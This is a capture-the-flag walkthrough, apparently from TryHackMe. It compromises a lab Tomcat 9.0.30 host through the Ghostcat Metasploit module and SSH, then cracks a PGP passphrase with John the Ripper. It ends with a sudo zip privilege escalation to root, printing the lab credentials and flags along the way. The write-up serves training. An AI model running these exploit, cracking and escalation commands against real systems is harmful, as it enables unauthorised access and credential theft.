![][image3]

We start by going to the target IP but it isn’t accessible

so we run nmap:

![][image4]

*nmap 10.10.39.107 — open*

This revealed **four open ports**, and the 8080 port is there with http-proxy

Navigating to http://10.10.39.107:8080 in the browser landed me on an **Apache Tomcat** default page

![][image5]

## **Version shown: 9.0.30**

**![][image6]**

Googling *“tomcat 9.0.30 exploit”*, I came across the **Ghostcat vulnerability**, which allows **unauthenticated file reading** on vulnerable Tomcat versions.

So I fired up **Metasploit**

**![][image7]**

*msfconsole*

Then searched and used the Ghostcat module

![][image8]

![][image9]

*search ghostcat*

*use auxiliary/admin/http/tomcat\_ghostcat*

*show options*

*set RHOSTS 10.10.39.107*

*run*

After running it, we get:

Welcome to GhostCat  
skyfuck:8730281lkjlkjdqlksalks

the format clearly meant it has to be credentials and I utilize it on ssh:

![][image10]

*ssh skyfuck@10.10.39.107*

**Password:** 8730281lkjlkjdqlksalks

Now we are in \!

then I start exploring the contents

*ls \-la*  
*cd /home*  
*cd skyfuck*

nothing here so I backtrack and try:

![][image11]

*cd home/merlin*  
*ls \-la*  
*cat user.txt*

THM{GhostCat\_1s\_so\_cr4sy}

Next:

![][image12]

*sudo \-l*

but nothign positive

Then I realise seeing these 2 files with .pgp and .asc

* credential.pgp  
* tryhackme.asc

The .asc is the **PGP public key**, and .pgp is an **encrypted credential**.

Let’s try to decrypt

![][image13]

*cat tryhackme.asc*  
*gpg — import tryhackme.asc*  
*gpg — decrypt credential.pgp*

But it asks for a **passphrase** — so we have to crack it.

![][image14]

To crack the passphrase, I hosted the files locally to download on my attacker machine

## **On the target (inside SSH):**

**![][image15]**

*python3 \-m http.server — bind 10.10.39.107*

## **On attacker machine (new terminal):**

**![][image16]**

*wget http://10.10.39.107:8000/tryhackme.asc*  
*wget [http://10.10.39.107:8000/credential.pgp](http://10.10.39.107:8000/credential.pgp)*

Convert the public key for John the Ripper:

![][image17]

*gpg2john tryhackme.asc \> hash*

Now to crack it:

*john \--wordlist=/usr/share/wordlists/rockyou.txt hash*

We get the passphrase: alexandru  
(If it doesn’t display: john \--show hash)

Now decrypt:

![][image18]

*gpg — decrypt credential.pgp*

Passphrase: alexandru

That shows us this:

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

That makes it Time to switch users:

![][image19]

su merlin  
\# enter password \=\>

( asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j)

Now it’s time to perform privilege escalation:

*sudo \-l*

We see:

**(root : root) NOPASSWD: /usr/bin/zip**

Zip is a known **sudo exploit**. Using GTFOBins

![][image20]

![][image21]

*TF=$(mktemp \-u)*  
*sudo zip $TF /etc/hosts \-T \-TT ‘sh \#’*

And we are in \!

*cd /root*  
*cat root.txt*

That leads us to the root.txt

THM{Z1P\_1S\_FAKE}
